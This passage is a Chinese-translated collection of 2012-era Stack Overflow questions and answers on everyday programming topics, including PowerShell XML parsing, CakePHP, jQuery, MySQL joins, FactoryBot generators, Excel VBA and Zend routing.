2：假设需要锁：这是将包含锁的委托加入队列的正确实现吗？多个线程可能正在请求日志写入的可能性相当高。通过将委托排队到工作线程，文件 I/O 执行的长度不应影响应用程序本身。

3：假设有几个`logWriteDelegate`工人已经入队：代表会*按照他们被接收的顺序*被调用吗？即，***现在服务#32 ...现在服务#33***

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T15:23:44.903

1：是的，锁定它是必需的。它可以被多个线程访问，特别是因为您正在使用池。

2：嗯，它会起作用的。但它会使文件保持锁定状态，使其难以阅读。有一些预先存在的日志框架在这个问题上做了很多工作——可能值得我使用它们。

3：没有；使用锁和池，这是不期望在最终文件中严格排序的两个独立原因。事实上，由于池的原因，**单个线程的**消息可能会出现乱序。如果你想订购，你需要写入一个（同步的）队列，并有一个专门的工作人员将数据（同步）从队列中拉回并写入日志文件。同样，现有的日志框架将为您解决这个问题。

# c# - 使用 powershell 遍历 xml 元素

> ID：11702237
> 
> 赞同：1
> 
> 时间：2012-07-28T15:18:23.580
> 
> 标签：c#, xml, powershell, xpath, sharepoint-2010

我有一些具有不同元素的 xml 文件。我想用 c# 或 PowerShell 编写一些代码来遍历每个元素并获取值。我希望它足够通用，以便我可以将它与其他 xml 文件一起使用。所有 xml 文件具有相同的格式，但元素的名称不同。

非常感谢你的帮助。

```
<root>
  <list>
       <FirstName>Abc</FirstName>
       <LastName>LT</LastName>
       <Occupatoin>Eng</Occupation>
       <BirthDate></BirthDate>
      ...
 </list>
</root>

----------------------
XML file 2

<root>
  <Trainings>
       <Java>Ab</Java>
       <NET>b</NET>
       <SQL>c</SQL>
       <Powershell>d</Powershell>
      ...
 </Trainings>
</root> 
```

* * *

引入了另一个 xml，它将作为上述 xml 文件中元素迭代的基础。

根据下面每个元素的属性获取上面元素的值：

```
<root>
    <Element Name="Firstname />
    <Element Name="Lastname" />
    <Element Name="Occupation" />
    <Element Name="Java" />
    <Element Name="Net" />
...
</root>

[System.Xml.XmlDocument] $xdLists = new-object System.Xml.XmlDocument
[System.Xml.XmlDocument] $xdMig = new-object System.Xml.XmlDocument
$listfile = "C:\PowershellFiles\XmlLists.xml"
$xdLists.load($listfile)

$xdNodes= $xdLists.selectnodes("//DestinationLists/DestinationList")
$migCols = $xdLists.selectnodes("//MigrationColumns/Columns/Column")

#LOOP 1-----------------------------------------
foreach($xnode in $xdNodes)
{
    Write-Host $xnode.Attributes.GetNamedItem("MigrationFile").Value
    $destLists = $xnode.Attributes.GetNamedItem("Name").Value
    $migfiles = $xnode.Attributes.GetNamedItem("MigrationFile").Value

    Write-Host $destLists

    #Check if the xml file to read from exists

    if($migFiles -ne $null)
    {
            $xdMig.Load($migfiles)

            $spSite = Get-SPSite "http://sp2010:100" 
            $spWeb = $spSite.OpenWeb()

            $list = $spWeb.Lists[$destLists]

            foreach($nCol in $migCols)
            {
                $destListCol =  $nCol.Attributes.GetNamedItem("DestList").Value
                $sourcCol =  $nCol.Attributes.GetNamedItem("SourceCol").Value

#               Write-Host $col " - " $list.Title

                if($destListCol -eq $list.Title)
                {
                    Write-Host $destListCol " - " $list.Title " - Source Column: " $sourcCol  -ForegroundColor Green
                    Write-Host

                    # ----------------------- time to search the exported lists --------------------
                    Write-Host "Search the exported list for the right column" -ForegroundColor  DarkYellow

                    if($xdMig.DocumentElement -ne $null)
                        {
                            $xnList = $xdMig.DocumentElement.ChildNodes

                    #           LOOP 2----------------------------------------
                            Write-Host $xnList.Count " items found" -ForegroundColor Red
                            foreach($xn in $xnList)
                            {
                                Write-Host $xn.Name -ForegroundColor Red

                                $nList = $xdMig.SelectNodes("//"+$xn.Name)
                                $lItem = $list.Items.Add()

                                foreach($n in $migCols)
                                  {

                                    if($n.Attributes -ne $null)
                                    {
                                        $sourceCol = $n.Attributes.GetNamedItem("SourceCol").Value
                                        $destCol = $n.Attributes.GetNamedItem("DestCol").Value
                                        $destList = $n.Attributes.GetNamedItem("DestList").Value

                                        Write-Host "Dest Col: " $destCol  "-  Sour Col: " $xn[$sourceCol].Name 
                                        Write-Host $destList -ForegroundColor Red

                                        if($list.Title -eq $destList)
                                        {
                                            if($xn[$sourceCol] -ne $null )
                                            {
                                                if($list.Fields[$destCol] -ne $null)
                                                {
                                                    $lItem[$destCol] = $xn[$sourceCol].InnerText    
                                                }

                                            }else
                                            {
                                                Write-Host   $sourceCol " was not matched" -ForegroundColor Yellow
                                            }
                                        }
                                     }
                                  }
                                  $lItem.Update()
                                  Write-Host "-----------------------------------"
                            }

                        }
                }
            }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T15:35:07.650

您可以将[powershell](/questions/tagged/powershell "显示标记为“powershell”的问题")与[xpath](/questions/tagged/xpath "显示标记为“xpath”的问题")结合使用。假设您已修复 XML 错误并重命名`Element.Name`为与数据文件中相同的大小写：

`your_file.xml`固定内容：

```
<root> 
  <list> 
       <FirstName>Abc</FirstName> 
       <LastName>LT</LastName> 
       <Occupation>Eng</Occupation> 
       <BirthDate></BirthDate> 
      ... 
 </list> 
</root> 
```

`index_file.xml`固定内容：

```
<root> 
    <Element Name="FirstName" /> 
    <Element Name="LastName" /> 
    <Element Name="Occupation" /> 
    <Element Name="Java" /> 
    <Element Name="NET" /> 
... 
</root> 
```

`PoSH`映射他们：

```
$xmlIndex = [xml](gc ".\index_file.xml")
$xml = [xml](gc ".\your_file.xml")
$allValues = @{}; 

$xmlIndex.SelectNodes("//Element/@Name") | 
    %{ $nodeName = $_."#text"; $xml.SelectNodes("//$nodeName/text()") } |
    % { $allvalues[$_.ParentNode.ToString()] = $_.Value };

$allValues | ft 
```

将遵循输出

```
Name                           Value
----                           -----
Occupation                     Eng
FirstName                      Abc
LastName                       LT 
```

和

```
Name                           Value
----                           -----
NET                            b
Java                           Ab 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-11-30T21:43:26.080

我遇到了一个类似的需求，我需要深入研究不同的 XML 结构。这个递归例程适用于我遇到的大多数 xml。

```
function GetNodes($root,$j){
    $nodes=$root.ChildNodes
    $j++
    Foreach($child in $nodes){
       $tabs=""
       for ($i = 1; $i -lt $j; $i++){ $tabs+="`t"  }
       if ($child.NodeType -eq "Element"){
            $value=$root.($child.Name)
            if ($value.GetType().Name -eq "XmlElement"){
                write-host "$tabs$($child.Name)" -ForegroundColor green
            }else{
                write-host "$tabs$($child.Name): $($value)"
            }  
        }
        if ($child.HasChildNodes){ GetNodes $child $j }
    }
    $j--
}

[xml]$xml=get-content C:\Temp\test.xml
GetNodes $xml 
```

文件 1 的输出如下所示

```
root
    list
        FirstName: Abc
        LastName: LT
        Occupation: Eng
        BirthDate: 
```

我结合文件 1 和 2 来获得这个输出：

```
root
    list
        FirstName: Abc
        LastName: LT
        Occupation: Eng
        BirthDate:
    Trainings
        Java: Ab
        NET: b
        SQL: c
        Powershell: d 
```

# profiling - 是否有用于显示 GPU 顶点和片段处理负载的 WebGL 分析器？

> ID：11702239
> 
> 赞同：1
> 
> 时间：2012-07-28T15:18:52.213
> 
> 标签：profiling, webgl

我希望能够判断我是受 CPU 限制还是受 GPU 顶点限制或 GPU 片段限制。我希望我能找到一个提供此信息的分析器，但我似乎找不到任何东西。有谁知道可以做到这一点的分析器？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T18:09:27.023

即使没有分析器，您也可以很容易地分辨出其中的一些。将您的画布（或您正在渲染的 FBO）缩小到 1x1 像素。如果您的应用程序加速非常快，您可能会受到 GPU 片段的限制。如果它几乎没有加速你可能是 CPU 或 GPU 顶点绑定。

至于 CPU，vs GPU Vertex Bound 将您对 drawArrays 和 drawElements 的调用中的计数更改为 0。如果它仍然运行缓慢，则说明您受 CPU 限制。如果它运行得很快，你就是 GPU 顶点绑定。

否则，在 Chrome 上，我认为如果您传入“--in-process-gpu”，我相信您可以在 Windows 上运行 PIX 或在 OSX 上运行 OpenGL Profiler 并分析整个浏览器，尽管我已经有一段时间没有这样做了。

# c# - 无法将字典项添加到 listBox

> ID：11702240
> 
> 赞同：0
> 
> 时间：2012-07-28T15:18:55.827
> 
> 标签：c#, windows, .net

我有一本字典，里面有几个项目：

```
public static Dictionary<string, string> vmDictionary = new Dictionary<string, string>(); 
```

我有一种方法可以将其中的项目添加到列表框中：

```
 foreach (KeyValuePair<String, String> entry in MyApp.vmDictionary)
        {
            ListViewItem item = new ListViewItem();
            item.SubItems.Add(entry.Value[0]);
            item.SubItems.Add(entry.Value[1]);
            selectVMListView.Items.Add( 
```

}

虽然我收到以下错误：

> 错误 2 参数 1：无法从 'char' 转换为 'string'

与这些行有关：

```
 item.SubItems.Add(entry.Value[0]);
            item.SubItems.Add(entry.Value[1]); 
```

entry.Value[0] 和 [1] 如果我没记错的话应该是字符串，但由于某种原因它抱怨它们是字符：S

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:25:54.863

`entry.Value`返回 的值组件`KeyValuePair<,>`，在这种情况下是 a `string`，然后当您在 this 上使用索引时`string`，您将得到一个字符。我认为你的意思是：

```
item.SubItems.Add(entry.Key);
item.SubItems.Add(entry.Value); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T15:26:01.423

```
 item.SubItems.Add(entry.Value[0]);
    item.SubItems.Add(entry.Value[1]); 
```

您正在尝试在 KeyValuePair 中添加 Value 的第一个字符。也许你正在尝试这样做？

```
 item.SubItems.Add(entry.Key);
    item.SubItems.Add(entry.Value); 
```

# php - cakephp 主键不能用于用户登录

> ID：11702244
> 
> 赞同：0
> 
> 时间：2012-07-28T15:19:37.453
> 
> 标签：php, cakephp, primary-key, cakephp-model

我有一个奇怪的问题。我的*员工*表有**id** ->int(11) 作为主键。它还有**代码**->varchar(36)、**密码**和其他一些字段。此代码和密码是员工用于登录系统的两个字段。我使用 cakePHP 表单助手构建带有 Code 字段和 Password 字段的登录页面；事情进展顺利。

今天，当我尝试使用 $this->Model->save 更新员工表的另一个字段时，它插入了一个新行而不是更新。那是我了解到我需要将代码设置为主键的时候。所以我放入`$primaryKey = 'code'`了我的 Employee 模型。

我输入的那一刻，我的登录页面中的代码字段消失了，只留下密码字段。当我删除 时`$primaryKey = 'code'`，代码字段又回来了。

所以它与将代码设置为模型中的主键有关。有什么解决办法吗？

我需要能够使用**代码**更新员工行并在登录页面中保留我的代码字段。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T15:41:36.520

听起来`code`本质上是一个用户名字段。如果`code`未定义为数据库中的主键，最好不要将`primaryKey`Model 属性设置为`code`.

我想大多数人会建议使用主键字段`id`来告诉 Cake 要更新哪个员工记录。但是，如果您必须使用`code`，请尝试以下操作：

假设您的`code`字段在数据库中具有唯一约束或使用 Cake 验证进行唯一验证，您可以使用它`code`来查找要更新的记录。一旦您拥有该记录（`$current`在以下情况下），您就可以获得主键`id`，这是必需的，因此`Model::save`知道要更新哪个记录。

```
public function edit($code = null) {
    $current = $this->Employee->find('first', array(
        'conditions' => array(
            'Employee.code' => $code
        )
    ));
    $this->Employee->id = $current['Employee']['id'];

    if (!$this->Employee->exists()) {
        throw new NotFoundException(__('Invalid employee'));
    }
    if ($this->request->is('post') || $this->request->is('put')) {
        if ($this->Employee->save($this->request->data)) {
            $this->Session->setFlash(__('The employee has been saved'));
            $this->redirect(array('action' => 'index'));
        } else {
            $this->Session->setFlash(__('The employee could not be saved. Please, try again.'));
        }
    } else {
        $this->request->data = $current;
    }
} 
```

# jquery - Jquery滚动到特定坐标的动画

> ID：11702246
> 
> 赞同：0
> 
> 时间：2012-07-28T15:19:54.377
> 
> 标签：jquery, scrollto, scrolltop

所以我试图让一个链接非常缓慢地滚动到同一页面上的某个坐标（不是元素）。我试图查看 Jquery 站点，但似乎插件站点已关闭。

任何人都可以提供嵌入在 html 示例源代码中的链接，因为我对 jquery 不太了解。

[这是插件的链接](http://archive.plugins.jquery.com/project/ScrollTo)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:33:25.970

嗨，您不需要插件。它可能会为您节省一些开销...请试试这个，我希望它可以解决您的问题

假设您有以下链接

```
<a id="button" href="#">click me</a> 
```

添加以下代码

```
$(document).ready(function(){
  $('a#button').bind('click', function(event){
    $('html,body').animate({
      scrollTop: '100'
    });
    event.preventDefault();
  });
}); 
```

# mysql - 加入 3 个表 sql join

> ID：11702247
> 
> 赞同：0
> 
> 时间：2012-07-28T15:19:58.730
> 
> 标签：mysql, join, left-join

我有 3 个表`users(name, email), reviews(review, entity, user) and votes(vote, entity, user)`，我想进行一个查询，该查询返回为特定实体提供的所有评论，如果用户投票支持该实体，则从 votes 表中投票，否则投票地点应为 null。我写的查询是

```
select users.name as name, 
reviews.review as review, 
votes.vote as vote 
from 
users join reviews on users.email=reviews.user 
left join votes on users.email=votes.user 
where reviews.entity='entity_id' 
```

但是这个查询导致了一些评论的多行，我使用 group by 使它工作，我无法理解左连接的行为，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:32:22.627

您没有加入任何特定实体的投票，请尝试以下操作：

```
select users.name as name, 
reviews.review as review, 
votes.vote as vote 
from 
users join reviews on users.email=reviews.user 
left join votes on users.email=votes.user and reviews.entity = votes.entity
where reviews.entity='entity_id' 
```

# jquery - 使用 cookie 和 jQuery

> ID：11702254
> 
> 赞同：1
> 
> 时间：2012-07-28T15:20:58.070
> 
> 标签：jquery, cookies

今天我决定更好地了解cookies。最简单的方法似乎是 jQuery。我使用了 carhartl 的[Cookie 插件](https://github.com/carhartl/jquery-cookie/blob/master/jquery.cookie.js)。

这是一个[**小提琴**](http://jsfiddle.net/BramVanroy/Y3pjm/3/)。

基本上，我想要的是：当用户单击“X”时，弹出窗口关闭（工作正常）并写入一个 cookie，以便下次用户点击该页面时，他看不到弹出窗口再次！

```
function showPopUp() {
    var popUpMT = -($("#popUp").height() / 2) - 50;
    $("#popUp").css("marginTop", popUpMT).fadeIn("slow");
    $("#overlay").fadeIn("fast");
}

function setCookie() {
    $("#popUp").fadeOut("fast");
    $("#overlay").fadeOut("fast");
    $.cookie("popUpCookie", {
        expires: 365
    });
}

$(document).ready(function() {
    var ourCookie = $.cookie("popUpCookie");
    if (ourCookie === null) {
        showPopUp();
    }

    $("#popUp span#close").click(function() {
        setCookie();
    });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:27:58.060

在您的`setCookie`函数中，添加一些值作为第二个参数，如[文档](https://github.com/carhartl/jquery-cookie/blob/master/README.md)中所示。

```
$.cookie("popUpCookie", "true", { expires: 365}); 
```

在您的小提琴中，您只需传入名称和设置对象。除了它应该在[这个更新](http://jsfiddle.net/Y3pjm/7/)中为我工作和做。

# geometry - 如何计算B点的高度？

> ID：11702258
> 
> 赞同：0
> 
> 时间：2012-07-28T15:21:42.877
> 
> 标签：geometry

我有一个测量点数据，其中包含坐标 X、Y、高度、角度（倾角）、方位角和深度（距离）。例如，A点：

东区：290694

北向：715927

海拔：1060

角度：65°

方位角：45°

距离：150

你能告诉我锄头我可以计算终点（轨迹结束）高度吗？感谢您的时间和评论

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-30T20:06:02.270

我不精通测量员的技术语言，所以我将重申我理解的问题。

测量员是`Elevation`球形行星表面上方的单位。他观察到一个点`B`，该点`Angle`高于地平线，`Distance`单位距离。角度也可以低于地平线，在这种情况下`Angle`为负。求`Height`，点`B`到行星表面的距离。

![在此处输入图像描述](../Images/3aa65cbc417760c6d8fd4e3aac760916.png)

（行星不按比例。）

问题可以分解为简单的几何形式。

![在此处输入图像描述](../Images/3211dd7786c36caf5f8a64c8bbbdff2a.png)

此图中的所有内容都是已知的，除了`Height`。我们有三角形的两条边和一个角，所以我们可以应用[余弦定律](http://en.wikipedia.org/wiki/Law_of_cosines)。

```
let a = Elevation + Radius
let b = Distance
let c = Height + radius
let gamma = Angle + 90 degrees
c^2 = a^2 + b^2 - 2ab*cos(gamma)
c = sqrt(a^2 + b^2 - 2ab*cos(gamma))
Height + Radius = sqrt(a^2 + b^2 - 2ab*cos(gamma))
Height = sqrt(a^2 + b^2 - 2ab*cos(gamma)) - Radius 
```

如果你在一个很小的球体上进行测量工作，那么地平线会比地球上的要低。用地平线和重力方向之间的角度替换`90`上述方程。

# php - 如何显示从MySQL按日期分组的行返回的标题以进行列表视图

> ID：11702261
> 
> 赞同：0
> 
> 时间：2012-07-28T15:22:02.850
> 
> 标签：php, mysql, listview, date, timestamp

我正在尝试从 mysql 中提取消息，按日期对它们进行分组，并在列表视图中显示结果，每个日期都有**一个**标题。

我想出了如何从 mysql 中按日期分组并按 desc 时间戳排序。

我的想法是如何为每个日期只显示一个标题，因为行是使用 php 中的 while() 函数返回的。有人可以阐明一下吗？

这是我到目前为止所拥有的。

```
$st = $this->db->prepare("SELECT date(timestamp) as date, message, user_id, target_id, msg_id, msg_type, target_name 
FROM message  
WHERE (user_id=? OR target_id=?)  
GROUP BY date  
ORDER BY timestamp DESC");  
            $st->bindParam(1, $y['user_id'], PDO::PARAM_INT);
            $st->bindParam(2, $y['user_id'], PDO::PARAM_INT);
            $st->execute();

            echo'<ul data-role="listview" id="message_listview">';

            if($st->rowCount() < 1){
                echo'You have no messages';
                exit();
            }       

            while($row = $st->fetch(PDO::FETCH_OBJ)){ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T15:26:54.743

```
$date = ''; // initialize $date with an invalid value
while($row = $st->fetch(PDO::FETCH_OBJ))
{
    if($date != $row['date'])
    {
        // display date only when it changes
        $date = $r['date'];
        echo $date;
    }
    // display the other fields here
} 
```

# .net - 不在本地网络上的两台外部计算机之间流式传输数据

> ID：11702264
> 
> 赞同：-3
> 
> 时间：2012-07-28T15:22:23.563
> 
> 标签：.net, vb.net, vba, vb6

我试图从工作中的计算机屏幕流式传输计算机的家庭屏幕，最好的方法是什么？

```
 listen

 stream 
```

发送图像的基础

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T21:39:58.660

RDP（远程桌面）和 VNC 都可以连接到任何 IP 地址。它不必是“本地”IP 地址。问题不在于他们是否可以做到，问题在于您的 IP 地址是否可以在必要的端口上公开访问。这是在网络上正确设置 IP 路由的问题。但是，您通常不想将这些端口暴露给 Internet，因此 VPN 通常用于在 Internet 上建立安全网络。Hamachi 是一款流行的免费且简单的 VPN 产品。如果您不想经历设置 VPN 的麻烦，还有许多其他产品只需要两端的互联网连接（例如 logmein、gotomypc 等），但是，这些需要通过他们的第三方服务器进行连接。

# ruby-on-rails - FactoryBot 可以在您的模型创建后生成工厂吗？

> ID：11702265
> 
> 赞同：57
> 
> 时间：2012-07-28T15:22:48.370
> 
> 标签：ruby-on-rails, ruby, factory-bot

当在 Gemfile 中的 dev 和 test 块中包含 factory_bot_rails gem 时，rails 将在生成模型时自动生成工厂。

有没有办法在你的模型生成后生成工厂？

* * *

注意：FactoryBot 以前被命名为 FactoryGirl

* * *

## 回答 #1

> 赞同：165
> 
> 时间：2013-02-05T00:08:36.673

首先，查看源项目以了解它是如何实现的：

[https://github.com/thoughtbot/factory_bot_rails/blob/master/lib/generators/factory_bot/model/model_generator.rb](https://github.com/thoughtbot/factory_bot_rails/blob/master/lib/generators/factory_bot/model/model_generator.rb)

之后，尝试猜测它是如何工作的：

```
rails g factory_bot:model Car name speed:integer 
```

结果是：

```
create  test/factories/cars.rb 
```

和内容：

```
# Read about factories at https://github.com/thoughtbot/factory_girl

FactoryBot.define do
   factory :car do
     name "MyString"
     speed 1
   end
end 
```

请记住，当您使用 rails g 时，您可以随时撤消它，使用 rails d

```
rails d factory_bot:model Car name speed:integer 
```

注意：FactoryBot 以前被命名为 FactoryGirl

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-07-28T22:32:39.130

该`--fixture-replacement`选项将让您告诉 Rails 为构建测试数据生成什么。您可以在`config/application.rb`文件中将此设置为默认值，如下所示：

```
config.generators do |g|
  g.fixture_replacement :factory_bot, suffix_factory: 'factory'
end 
```

来源：[https ://github.com/thoughtbot/factory_bot_rails/blob/master/features/fixture_replacement_config.feature#L21](https://github.com/thoughtbot/factory_bot_rails/blob/master/features/fixture_replacement_config.feature#L21)

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2015-01-08T15:12:45.577

我有一个正好适合这个[https://github.com/markburns/to_factory的宝石](https://github.com/markburns/to_factory)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2018-05-13T18:12:09.263

这适用于我使用 rails g factory_bot:model User 运行命令或只是将命令输出。您仍然必须填写该值。

```
@run_command        = true
@force              = true
@columns_to_ignore  = %w[id created_at update_at]
@tables_to_ignore = %w[schema_migrations ar_internal_metadata]
tables = ActiveRecord::Base.connection.tables.reject{|t| (@tables_to_ignore || []).include?(t)}

tables.each do |table|
  klass = table.singularize.camelcase.constantize
    command = "rails g factory_bot:model #{klass.to_s} #{klass.columns.reject do |c|
      (@columns_to_ignore || []).include?(c.name)
    end.map do |d|
      "#{d.name}:#{d.sql_type == 'jsonb' ? 'json' : d.type}"
  end.join(' ')}"
  command << ' --force' if @force
  puts command
  puts %x{#{command}} if @run_command
  puts (1..200).to_a.map{}.join('-')
end 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-05-17T19:55:27.030

这不是一个答案，但因为我还不能发表评论：我认为你可以用它来解决你的部分问题。您可以使用名为 schema_to_scaffold 的 gem 来生成 factory_girl:model 命令字符串。它输出：

rails generate factory_girl:model users fname:string lname:string bdate:date email:string encrypted_pa​​ssword:string

来自您的 schema.rb 或您重命名的 schema.rb。

检查[这里](https://github.com/frenesim/schema_to_scaffold)或[这里](https://rubygems.org/gems/schema_to_scaffold)

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2019-10-31T13:35:59.397

将 Factory Bot 配置为夹具替代品，因此您不必手动创建工厂。

在`config/application.rb`：

```
config.generators do |g|
  g.test_framework :rspec, fixture: true
  g.fixture_replacement :factory_bot, dir: 'spec/factories'
end 
```

更多信息：[https ://github.com/thoughtbot/factory_bot_rails/blob/master/features/fixture_replacement_config.feature](https://github.com/thoughtbot/factory_bot_rails/blob/master/features/fixture_replacement_config.feature)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-09-19T10:08:18.737

不完全相关。

我还构建了一个[gem](https://github.com/cdragon1116/factory_bot_factory)来从现有数据构建工厂。

希望它可以帮助您加快进程......

```
puts FactoryBotFactory.build(User.new, file_path: 'spec/factories/user.rb')
puts FactoryBotFactory.build(User.last, file_path: 'spec/factories/user.rb')

# example output from User.new
FactoryBot.define do
  factory :user, class: User do
    id { nil }
    name { nil }
    created_at { nil }
    updated_at { nil }
    display_name { nil }
    image_url { nil }
    is_active { true }
  end
end 
```

如果您需要构建假数据，您还可以配置自定义转换器。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2014-01-23T21:49:32.013

这里有一些很好的答案，但另一种选择是使用[stepford](https://github.com/garysweaver/stepford)。对于一些使用具有外键约束的模式的项目，deep_* 方法等可能会有所帮助，这是一种通过命令行生成工厂的简单方法。

# jquery-mobile - 以编程方式设置 JQuery Mobile 滑块值

> ID：11702269
> 
> 赞同：3
> 
> 时间：2012-07-28T15:24:07.817
> 
> 标签：jquery-mobile

如何以编程方式在 JQuery mobile 中设置滑块的值？我定义了以下滑块：

```
<label for="optionSlider">Are you sure?</label>
<select id="optionSlider" name="slider" data-role="slider">
  <option value="no">No</option>
  <option value="yes">Yes</option>
</select> 
```

显示页面时，我想将其设置为“是”。我知道我可以使用“selected”属性，但是因为该值是动态的，我需要弄清楚如何以编程方式设置它。目前，我正在使用以下内容：

```
$("#myPage").live("pageshow", function () {
  var flag = "yes"
  if ((flag != null) && (flag != undefined)) {
    if (isTrackSet == "no") {
      $("#optionSlider", "#myPage").val("no");
    } else {
      $("#optionSlider", "#myPage").val("yes");
    }
  }
} 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-28T15:34:48.980

您需要在滑块上调用刷新：

```
.slider("refresh"); 
```

[http://jquerymobile.com/demos/1.0a4.1/docs/forms/forms-slider.html](http://jquerymobile.com/demos/1.0a4.1/docs/forms/forms-slider.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-21T07:20:22.387

这对我有用

```
 <select name="slider" id="stopplay" data-role="slider">
     <option value="off">Play</option>
     <option value="on" >Stop</option>
   </select>

$("#stopplay").val('on').slider("refresh"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-11-03T11:14:15.947

我尝试了许多不同的方法，但总是最终得到这个错误：

> 在初始化之前不能调用滑块上的方法

最后我发现这种方法可行：

```
 $('#member').page(); //the id of the page where the slider resides
  $('#slider').val(listsize); // setting the value from a localstorage item
  $('#slider').slider('refresh'); 
```

# excel - 我需要将奇数行数据附加到偶数中并删除该行

> ID：11702270
> 
> 赞同：0
> 
> 时间：2012-07-28T15:24:22.373
> 
> 标签：excel, append, vba

我需要将 D1+D2 等备用行的数据附加到 excel 中，请告诉 mw 我该怎么做

我有很大的 excel，我正在寻找一个 VBA，以便我可以将奇数行数据附加到偶数行并开发奇数行。

```
 Surgical        Surgical
10  $1,800  Unit    8/5/2011    unit
        Surgical        Surgical
10  $4,000  Unit    9/2/2011    unit
        Surgical        Surgical
10  $2,000  Unit    8/12/2011   unit
        Surgical        Surgical
10  $1,250  Unit    8/12/2011   unit
        Surgical        Surgical
10  $1,517  Unit    8/19/2011   unit
        Surgical        Surgical
10  $1,250  Unit    8/19/2011   unit
        Surgical        Surgical
10  $2,000  Unit    8/12/2011   unit
        Surgical        Surgical
10  $2,200  Unit    8/19/2011   unit
        Surgical        Surgical
10  $0  Unit    8/19/2011   unit
        Surgical        Surgical
10  $1,251  Unit    8/12/2011   unit
        Surgical        Surgical
10  $1,500  Unit    8/12/2011   unit
        Surgical        Surgical
10  $1,001  Unit    9/1/2011    unit 
```

这些在两个单元格中，我想将数据添加到上一个单元格中，请帮助我

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-29T05:35:27.460

我只会使用这样的excel函数来做到这一点（假设您的原始数据在A列中）：

```
=IF(MOD(ROW(),2)=1,A1&" "&A2,"") 
```

这应该复制到与原始数据相邻的任何列上。然后对包含此公式的列执行过滤（在 Macintosh 上为 command+shift+F，在 Windows 机器上不同）并将其设置为仅显示空白行并删除它们。

如果你想在 VBA 中做到这一点

**假设数据在 A1:A10 范围内**：

```
Sub mergeAndDelete()
    Dim r As Range
    Set r = Range("A1:A10")  'set the range the data resides in

    For i = 1 To r.Rows.Count  'merge step
        If i Mod 2 = 1 Then   'this checkes to see if i is odd
            r.Cells(i, 1).Offset(0, 1).Value = r.Cells(i, 1).Value & " " & r.Cells(i + 1, 1).Value
        End If
    Next i

    For i = r.Rows.Count To 1 Step -1
        ' Check if i is even and delete the row in the next line
        If i Mod 2 = 0 Then    
            r.Cells(i, 1).EntireRow.Delete  
        End If
    Next i
End Sub 
```

此外，这会将偶数行添加到奇数行（基于您提供的示例 - 这与您实际所说的需要不同。）根据`if`需要修改语句。

# android - Android - VoIP 网络电话

> ID：11702272
> 
> 赞同：0
> 
> 时间：2012-07-28T15:25:00.750
> 
> 标签：android, voip, phone-call

我想使用 VoIP 技术通过网络拨打电话，但我不知道如何实现。是否有任何 API 或其他东西可以帮助我实现这个东西？我听说过Asterisk，但我不知道。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T15:33:59.690

如果您可以浏览现有的 VoIP 内容，那将会有所帮助。也许看看 Sipdroid。它也是开源的。

就 API 而言，也许音频捕获/播放部分会给你一个开始。请参阅[AudioTrack](http://developer.android.com/reference/android/media/AudioTrack.html)和[AudioRecord](http://developer.android.com/reference/android/media/AudioRecord.html)的 Android 文档。

# zend-framework - Zend_Translate | 路线颠倒

> ID：11702274
> 
> 赞同：1
> 
> 时间：2012-07-28T15:25:17.193
> 
> 标签：zend-framework, localization, routes, zend-translate, zend-config

我在使用自己定义的 ZF1.12 应用程序路由时遇到问题。语言参数的切换有效，但路线的翻译是相反的 - 例如：

[http://www.my-app.de/de/clients/login](http://www.my-app.de/de/clients/login)

[http://www.my-app.de/en/kunden/anmelden](http://www.my-app.de/en/kunden/anmelden)

为了管理我的语言，我注册了一个插件：

```
<?php

class FOO_Controller_Plugin_LangSelector extends Zend_Controller_Plugin_Abstract
{
public function routeShutdown(Zend_Controller_Request_Abstract $request) {

   if (substr($request->getRequestUri(), 0, -1) == $request->getBaseUrl()) {
        $locale = new Zend_Locale();
        $lang = $locale->getLanguage();
        $url = "http://my-app.de/" . $lang;
        Zend_Controller_Front::getInstance()->getResponse()->setRedirect($url);
    }

}

public function preDispatch(Zend_Controller_Request_Abstract $request)
{   
$lang = $request->getParam('language','');

if ($lang !== 'en' && $lang !== 'fr' && $lang !== 'de') {
    $request->setParam('language','de');
    }

$lang = $request->getParam('language');

    switch($lang)
    {
    case ("de"):
        $locale = 'de_DE';
        break;
    case ("en"):
        $locale = 'en_EN';
        break;
    case ("fr"):
        $locale = 'fr_FR';
        break;
    }

$zl = new Zend_Locale();
$zl->setLocale($locale);
Zend_Registry::set('Zend_Locale', $zl);

$translate = new Zend_Translate('csv', APPLICATION_PATH . '/configs/lang/'. $lang . '.csv' , $lang);
Zend_Registry::set('Zend_Translate', $translate);

}
} 
```

这工作正常。在我的 application.ini 中：

```
; Translator -------------------------------------------------------------------
resources.locale.registry_key = "locale" 
resources.locale.default = "de_DE"  

resources.translate.locale = "de"
resources.translate.registry_key = "Zend_Translate"
resources.translate.adapter = "csv"
resources.translate.content = APPLICATION_PATH "/configs/lang/de.csv"
resources.translate.options.scan = "directory"

; Routes -----------------------------------------------------------------------
resources.router.routes.defaultmodule.type = Zend_Controller_Router_Route_Module
